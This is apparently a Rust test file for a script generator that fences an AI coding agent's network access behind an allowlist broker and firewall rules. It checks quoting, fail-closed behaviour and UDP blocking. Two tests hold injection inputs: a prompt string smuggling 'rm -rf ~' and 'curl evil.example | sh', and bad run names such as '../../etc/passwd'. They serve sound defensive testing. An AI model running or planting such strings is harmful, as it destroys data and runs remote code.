//! What the guard script has to be true of before it is delivered to somebody
//! else's machine.
//!
//! A shell script generated on one computer and run on another is the worst
//! place in this crate for a mistake: it is not type-checked, its failures are
//! remote, and half of them are silent — a quoting bug does not crash, it runs
//! something else. So the checks here are about the two things that cannot be
//! seen by reading it: that it *parses* as a shell script at all, and that the
//! values written into it stay values.

use super::*;

fn guard(command: &str) -> Guard {
    Guard::new(
        "run-2f8a1c",
        command,
        Egress::plan(
            &["api.anthropic.com".into(), "registry.npmjs.org".into()],
            crate::policy::floor("claude", Some("https://github.com/naridon/aura.git")),
        )
        .expect("a plan"),
    )
    .expect("a guard")
}

/// Ask the machine's own shell whether this is a shell script.
///
/// The one check that would have caught every generated-script bug this project
/// has ever had. `sh -n` parses and does not run, so it costs nothing and is
/// safe to point at a script whose whole purpose is installing firewall rules.
fn parses(script: &str) -> Result<(), String> {
    use std::io::Write;
    use std::process::{Command, Stdio};

    let mut sh = Command::new("sh")
        .arg("-n")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| e.to_string())?;
    sh.stdin
        .as_mut()
        .ok_or("no stdin")?
        .write_all(script.as_bytes())
        .map_err(|e| e.to_string())?;
    let out = sh.wait_with_output().map_err(|e| e.to_string())?;
    if out.status.success() {
        Ok(())
    } else {
        Err(String::from_utf8_lossy(&out.stderr).into_owned())
    }
}

#[test]
fn the_script_is_a_shell_script() {
    let script = guard("claude 'fix the login'").script();
    parses(&script).expect("sh -n");
}

#[test]
fn a_command_full_of_quotes_is_still_one_value() {
    // The agent's own prompt arrives here already quoted by whoever built it,
    // and is then quoted again to survive being a variable in this script. A
    // single missed apostrophe is a second command running as the member.
    let hostile = "claude 'don'\\''t; rm -rf ~ #' && curl evil.example | sh";
    let script = guard(hostile).script();
    parses(&script).expect("sh -n");
    // It appears exactly once, as the value of one variable, and the dangerous
    // parts of it are inside the quoting rather than beside it.
    assert!(script.contains(&format!("AURA_EGRESS_CMD={}", q(hostile))), "{script}");
    assert!(!script.contains("\nrm -rf"), "{script}");
}

#[test]
fn a_run_name_that_is_not_a_name_is_refused_rather_than_quoted() {
    // It becomes a filename and a shell word on a machine we do not own.
    for bad in [
        "",
        "   ",
        "../../etc/passwd",
        ".hidden",
        "a b",
        "a;rm -rf ~",
        "a'b",
        "a/b",
        &"x".repeat(65),
    ] {
        assert!(
            Guard::new(bad, "claude", Egress::default()).is_err(),
            "{bad:?} was accepted as a run name"
        );
    }
    assert!(is_run_name("run-2f8a1c"));
    assert!(is_run_name("aura_egress.1"));
}

#[test]
fn there_is_nothing_to_confine_without_a_command() {
    assert!(Guard::new("run-1", "   ", Egress::default()).is_err());
}

#[test]
fn the_list_reaches_the_broker_as_one_argument() {
    let g = guard("claude");
    let script = g.script();
    assert!(
        script.contains(&format!("AURA_EGRESS_ALLOW={}", q(&g.egress().as_arg()))),
        "{script}"
    );
    // Every declared host and every floor host, and the model's own API among
    // them — an agent that cannot reach its model is a process, not an agent.
    for host in [
        "api.anthropic.com:443",
        "registry.npmjs.org:443",
        "github.com:443",
    ] {
        assert!(g.egress().as_arg().contains(host), "{host} was left out");
    }
    assert!(script.contains("egress broker \\"), "{script}");
    assert!(script.contains("--journal"), "{script}");
    assert!(script.contains("--port-file"), "{script}");
}

#[test]
fn the_broker_is_up_before_the_wall_is() {
    // The other order is a window in which the work is running and the list is
    // not — which is a run with no policy at all, for as long as it lasts.
    let script = guard("claude").script();
    let broker = script.find("egress broker").expect("the broker");
    let waited = script.find("AURA_EGRESS_PORT=$(cat").expect("the wait");
    let seatbelt = script.find("sandbox-exec -f").expect("the mac wall");
    let nft = script.find("nft -f -").expect("the linux wall");
    assert!(broker < waited, "{script}");
    assert!(waited < seatbelt && waited < nft, "{script}");
}

#[test]
fn a_machine_that_cannot_hold_the_wall_runs_nothing() {
    // Fail-closed is the whole posture. A run that could not confine and
    // carried on anyway is the one outcome nothing else here would catch.
    let script = guard("claude").script();
    let choose = script.find("aura_egress_wall=$(").expect("the choice");
    let refuse = script[choose..]
        .find("aura_egress_refuse")
        .expect("the refusal");
    let run = script[choose..].find("$AURA_EGRESS_CMD").expect("the work");
    assert!(refuse < run, "{script}");
    assert!(
        script.contains("Installing is unaffected"),
        "the refusal blames the wrong phase: {script}"
    );
}

#[test]
fn the_script_and_the_app_ask_which_wall_in_the_same_words() {
    // The app asks this over ssh before it delivers a guard, so a place that
    // cannot confine is found out while somebody is still looking at the
    // screen. Two spellings of the question would be two answers.
    let script = guard("claude").script();
    assert!(script.contains(crate::wall::WHICH), "{script}");
}

#[test]
fn the_seatbelt_profile_is_written_literally() {
    // An unquoted heredoc would let the shell expand `$` and backticks inside a
    // security profile on its way to disk. Nothing in the profile needs
    // expanding, so nothing is allowed to.
    let script = guard("claude").script();
    assert!(script.contains("<<'AURA_SEATBELT_PROFILE'"), "{script}");
    assert!(script.contains("(deny network*)"), "{script}");
    // The nftables one is the opposite case on purpose: the group's number is
    // read on the machine, so that heredoc must expand.
    assert!(script.contains("<<AURA_NFT_RULES"), "{script}");
    assert!(script.contains("meta skgid $AURA_EGRESS_GID"), "{script}");
}

#[test]
fn udp_is_dropped_on_both_walls() {
    // A domain allowlist is an HTTP proxy, and QUIC is UDP: a client that
    // speaks HTTP/3 goes around the proxy without noticing it.
    let script = guard("claude").script();
    assert!(script.contains("udp dport 443"), "{script}");
    assert!(script.contains("meta l4proto udp"), "{script}");
    // The mac profile permits TCP and never mentions UDP, which denies it by
    // construction — so finding `udp` allowed anywhere in it is the bug.
    let profile = crate::wall::seatbelt_profile();
    assert!(!profile.contains("udp"), "{profile}");
}

#[test]
fn the_work_is_pointed_at_the_broker_by_every_name_a_client_reads() {
    let script = guard("claude").script();
    for var in [
        "HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY", "http_proxy", "https_proxy", "all_proxy",
    ] {
        assert!(script.contains(&format!("{var}=\"$AURA_EGRESS_PROXY\"")), "{var}");
    }
    // Loopback is not proxied through the thing that is on loopback.
    assert!(script.contains("NO_PROXY='127.0.0.1,localhost'"), "{script}");
    assert!(script.contains("export HTTP_PROXY"), "{script}");
}

#[test]
fn the_agents_own_exit_code_is_the_runs_exit_code() {
    // A wrapper that swallows the status turns every failed agent into a
    // success, which is worse than not having the wrapper.
    let script = guard("claude").script();
    assert!(script.contains("AURA_EGRESS_RC=$?"), "{script}");
    assert!(script.trim_end().ends_with("exit \"$AURA_EGRESS_RC\""), "{script}");
    // And the broker does not outlive the run it was holding.
    assert!(script.contains("trap aura_egress_cleanup EXIT INT TERM HUP"), "{script}");
    assert!(script.contains("kill \"$AURA_EGRESS_BROKER\""), "{script}");
}

#[test]
fn the_journal_is_this_runs_and_lands_in_the_members_own_home() {
    let g = guard("claude");
    assert_eq!(g.rel_path(), ".config/aura/egress/run-2f8a1c.sh");
    assert_eq!(g.home_path(), "~/.config/aura/egress/run-2f8a1c.sh");
    assert_eq!(
        g.journal_home_path(),
        "~/.config/aura/egress/run-2f8a1c.jsonl"
    );
    let script = g.script();
    // `$HOME`, resolved by the machine: on a box with per-member accounts that
    // is the member's own home, which is the point — a journal names the hosts
    // one member's agent wanted.
    assert!(script.contains(r#"AURA_EGRESS_DIR="$HOME/.config/aura/egress""#), "{script}");
    assert!(script.contains("chmod 0700"), "{script}");
    assert!(script.contains("umask 077"), "{script}");
    // Last run's refusals are not this run's report.
    assert!(script.contains("rm -f \"$AURA_EGRESS_PORT_FILE\" \"$AURA_EGRESS_JOURNAL\""), "{script}");
}

#[test]
fn a_project_that_declared_nothing_still_gets_a_working_agent() {
    // The floor: no `[env.network]` anywhere, and the run can still reach its
    // own model and the remote it came from. Otherwise the first confined run
    // of every project is a puzzle.
    let egress = Egress::plan(&[], crate::policy::floor("codex", Some("git@github.com:x/y.git")))
        .expect("a plan");
    let g = Guard::new("run-bare", "codex", egress).expect("a guard");
    let arg = g.egress().as_arg();
    assert!(arg.contains("api.openai.com:443"), "{arg}");
    assert!(arg.contains("github.com:22"), "{arg}");
    parses(&g.script()).expect("sh -n");
}

#[test]
fn a_project_whose_agent_nobody_has_a_row_for_gets_an_empty_list_not_an_open_one() {
    // An empty allowlist reaches nothing, and every refusal names its host in
    // the journal — a fixable afternoon. The alternative, guessing a hostname,
    // is either a hole or a host nobody reviewed.
    let egress = Egress::plan(&[], crate::policy::floor("opencode", None)).expect("a plan");
    assert!(egress.is_empty());
    let script = Guard::new("run-unknown", "opencode", egress)
        .expect("a guard")
        .script();
    assert!(script.contains("AURA_EGRESS_ALLOW=''"), "{script}");
    parses(&script).expect("sh -n");
}
